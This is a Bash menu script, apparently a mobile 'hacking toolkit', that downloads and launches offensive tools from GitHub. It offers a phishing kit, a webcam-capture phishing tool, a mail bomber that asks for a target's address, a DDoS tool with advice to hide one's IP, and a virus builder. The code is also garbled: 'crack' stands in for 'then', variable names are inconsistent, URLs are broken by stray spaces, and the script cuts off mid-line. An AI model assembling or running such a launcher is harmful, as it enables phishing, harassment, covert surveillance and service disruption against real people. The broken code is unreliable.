clear
mkdir Tools
clear
echo -e '\033[31;40;1m
 █████╗ ██╗ ████████╗ ██████╗ ██████╗ ██╗
 ██╔══██╗██║ ╚══██╔══╝██╔═══██╗██╔═══██╗██║
 ███████║██║ ███████╗ ██║ ██║ ██║██║ ██║██║
 ██╔══██║██║ ╚══════╝ ██║ ██║ ██║██║ ██║██║
 ██║ ██║███████╗ ██║ ╚██████╔╝╚██████╔╝███████╗
 v4
\033[33;4mVersion:\033[0m 4 \033[33;4mCTRL+C:\033[0m exit \033[33;4mAuthor:\033[0m 4lbH4cker \e[37m[1]\e[36m Requests & Update \e[37m[2]\e[36m Phishing Tool
\e[37m[3]\e[36m WebCam Hack \e[37m[4]\e[ 36m Subscan
\e[37m[5]\e[36m Gmail Bomber \e[37m[6]\e[36m DDOS Attack
\e[37m[7]\e[36m How to use ? \e[37m[8]\e[36m Uninstall downloaded programs
\e[37m[9]\e[36m Ip Info \e[37m[10]\e[36m dorks-eye
\e[37m[11]\ e[36m HackerPro \e[37m[12]\e[36m RED_HAWK
\e[37m[13]\e[36m VirusCrafter \e[37m[14]\e[36m Info-Site
\e[37m[15]\ e[36m BadMod \e[37m[16]\e[36m Facebash
\e[37m[17]\e[36m DARKARMY \e[37m[18]\e[36m AUTO-IP-CHANGER

'

#Option Selection

read -p "Transaction number: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear

echo -e "\033[47;31;5m Installing update and requirements...\033[0m"
sleep 5
pkg install git -y
pkg install python python3 -y
pkg install pip pip3 -y
pkg install curl -y
apt update
apt upgrade -y
clear
echo -e "\033[47;3;35m Updating complete...\033[0m" sleep 3
bash alhack.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
clear
echo -e "\033[47;3;35m Installation may take a while\033[0m"
sleep 3
cd Tools
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh elif [[ $islem == 3 || $islem == 03 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https ://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
clear
echo -e "\033[47;3;35m Installation may take a while\033[0m"
sleep 3
git clone https://github.com/zidansec/subscan
cd subscan
read -p "Enter a domain p .sh (example.com): " sc
./subscan $sc

elif [[ $islem == 5 || $islem == 05 ]]; then
clear
echo -e "\033[47;3;35m Installation may take a while\033[0m"
sleep 3
cd Tools
git clone https://github.com/juzeon/fast-mail-bomber.git
cd fast -mail-bomber/
mv config.example.php config.php
php index.php update-providers
rm -rf data/nodes.json data/dead_providers.json
echo -e "\033[47;3;35m This installation will taking a long time\033[0m"
echo -e "\033[47;3;35m To stop press Ctrl+C\033[0m"
sleep 4
php index.php update-nodes
php index.php refine-nodes
echo " -------------------------"
read -p "Enter an email address to bombard: " mail
echo "-------- -----------------"
php index.php start-bombing $mail

elif [[ $islem == 6 || $islem == 06 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m "
sleep 3
cd Tools
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py
echo ""
echo -e "\033[47;3;35m Before using, hide your ip\033[0m"

elif [[ $islem == 7 || $islem == 07 ]]; crack
clear
echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
sleep 10
echo "Wait 10 seconds"
bash alhack.sh


elif [[ $islam == 8 || $islam == 08 ]]; crack
clear
echo -e "\033[47;3;35m REMOVING DOWNLOADED PROGRAMS...\033[0m"
sleep 3
rm -rf Tools

bash alhack.sh

elif [[ $islam == 9 || $islam == 09 ]]; then
clear
echo -e "\033[47;3;35m Installation may take a while\033[0m"
sleep 3
cd Tools
apt update
apt install git curl
git clone https://github.com/htr-tech/track -ip.git
cd track-ip
bash trackip
elif [[ $islem == 10 || $islem == 010 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033 [0m"
sleep 3
cd Tools
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py
elif [[ $islem == 11 | | $islam == 011 ]]; then
clear
echo -e "\033[47;3;35m Installation may take a while\033[0m"
sleep 3
cd Tools
apt update && apt upgrade && apt install git && apt install python2
git clone https://github. com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py
elif [[ $islem == 12 || $islem == 012 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $islem == 13 || $islem == 013 ] ]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
pkg install git -y
cd TigerVirus
bash app.sh

elif [[ $islam == 14 || $islam == 014 ]]; crack
c
